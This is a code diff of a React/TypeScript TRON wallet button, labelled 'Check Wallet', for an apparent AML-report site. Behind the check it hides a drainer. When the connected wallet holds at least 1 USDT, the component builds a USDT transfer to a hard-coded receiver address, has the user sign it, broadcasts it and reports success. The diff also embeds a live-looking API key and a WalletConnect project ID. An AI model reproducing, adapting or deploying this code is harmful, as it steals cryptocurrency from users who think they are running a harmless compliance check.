@@ -1,20 +1,49 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
 
 import React, { useState, useEffect } from 'react';
-import { tronWeb, adapter } from './tronWallet.ts';  // <-- импорт из tronWallet.ts
+import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
+import { TronWeb } from 'tronweb';
 import { Buffer } from 'buffer';
 
 window.Buffer = Buffer; // полифилл для Buffer
 
+// Константы контракта и получателя
 const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
+
+// Инициализация TronWeb
+const tronWeb = new TronWeb({
+  fullHost: 'https://api.trongrid.io',
+  headers: {
+    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
+  },
+});
+
+// Инициализация WalletConnectAdapter
+const adapter = new WalletConnectAdapter({
+  network: 'Mainnet',
+  options: {
+    relayUrl: 'wss://relay.walletconnect.com',
+    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
+    metadata: {
+      name: 'AML',
+      description: 'TRON + WalletConnect Integration',
+      url: 'https://amlreports.pro',
+      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
+    },
+  },
+  web3ModalConfig: {
+    themeMode: 'dark',
+  },
+});
 
 export const TronAuthButton: React.FC = () => {
   const [status,  setStatus]  = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
-  // Предварительная инициализация adapter для ускорения открытия модалки
+  // Прединициализация adapter для ускорения открытия модалки
   useEffect(() => {
+    // если есть метод init — вызовем его
     ;(adapter as any).init?.().catch(() => {});
   }, []);
 
@@ -24,33 +53,37 @@ export const TronAuthButton: React.FC = () => {
     setStatus(null);
 
     try {
-      if (!adapter.connected) {
-        await adapter.connect();
+      // Сбрасываем старую сессию, если осталась
+      if (adapter.connected) {
+        await adapter.disconnect();
       }
+      // Подключаемся
+      await adapter.connect();
+
       const userAddress = adapter.address;
       if (!userAddress || !tronWeb.isAddress(userAddress)) {
         throw new Error('Invalid wallet address');
       }
       tronWeb.setAddress(userAddress);
 
-      // Проверка TRX (минимум 2 TRX)
+      // Проверяем TRX (минимум 2 TRX)
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx    = trxRaw / 1e6;
       if (trx < 2) {
-        throw new Error('❌ Insufficient TRX. At least 2 TRX is required.');
+        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
+        return;
       }
 
-      // Проверка USDT
+      // Проверяем USDT
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt         = Number(usdtRaw) / 1e6;
       if (usdt < 1) {
         setStatus('succes');
-        await adapter.disconnect();
         return;
       }
 
-      // Строим и отправляем транзакцию
+      // Формируем TX
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -61,25 +94,18 @@ export const TronAuthButton: React.FC = () => {
         ],
         userAddress
       );
+
+      // Подписываем и отправляем
       const signedTx = await adapter.signTransaction(transaction);
-      const result   = await tronWeb.trx.sendRawTransaction(signedTx);
-      if (result?.result) {
-        setStatus('succes');
-      } else {
-        throw new Error('Send failed');
-      }
+      const raw      = (signedTx as any).rawTransaction ?? signedTx;
+      const result   = await tronWeb.trx.sendRawTransaction(raw);
+
+      setStatus(result?.result ? 'succes' : '⚠️ Connection or transaction error');
+
     } catch (err: any) {
       console.error('Error:', err);
-      const msg = err.message || err.toString();
-      if (msg.includes('❌ Insufficient TRX')) {
-        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
-      } else if (
-        msg.includes('User rejected') ||
-        msg.includes('Modal is closed') ||
-        msg.includes('Timeout')
-      ) {
-        // тихо игнорируем
-      } else {
+      const msg = err.message || String(err);
+      if (!/User rejected|Modal is closed|Timeout/.test(msg)) {
         setStatus('⚠️ Connection or transaction error');
       }
     } finally {
@@ -89,14 +115,15 @@ export const TronAuthButton: React.FC = () => {
   };
 
   return (
-    <div onClick={connectWallet} className="AuthButton">
-      {loading && (
-        <div className="modal__overflow">
-          <div className="modal"><p>🔄 Connecting wallet...</p></div>
-        </div>
-      )}
+    <>
+      <div
+        className={`AuthButton${loading ? ' disabled' : ''}`}
+        onClick={connectWallet}
+      >
+        {loading ? '🔄 Connecting...' : 'Check Wallet'}
+      </div>
 
-      {!loading && status && (
+      {status && (
         <div className="modal__overflow">
           <div className="modal">
             {status !== 'succes' ? (
@@ -124,6 +151,6 @@ export const TronAuthButton: React.FC = () => {
           </div>
         </div>
       )}
-    </div>
+    </>
   );
 };
